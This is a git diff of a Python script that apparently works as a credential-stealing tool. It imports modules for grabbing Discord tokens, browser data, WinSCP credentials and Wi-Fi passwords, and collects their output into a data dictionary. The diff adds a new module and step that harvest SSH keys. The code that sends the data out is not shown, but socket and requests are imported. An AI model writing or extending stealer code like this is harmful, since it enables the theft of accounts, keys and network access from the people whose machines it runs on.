@@ -1,6 +1,6 @@
 import json
 import os
-from libs import discord_grabber, browsers, win_scp, wpa_grab, obs, connection_handler, enum_windows
+from libs import discord_grabber, browsers, win_scp, wpa_grab, obs, connection_handler, enum_windows, ssh_keys
 import socket
 import requests
 
@@ -44,6 +44,13 @@ except:
 print('Finding WPA info...')
 try:
     data['WPA'] = wpa_grab.get_wifi()
+    print()
+except:
+    pass
+
+print('Finding SSH info...')
+try:
+    data['SSH'] = ssh_keys.find_keys()
     print()
 except:
     pass
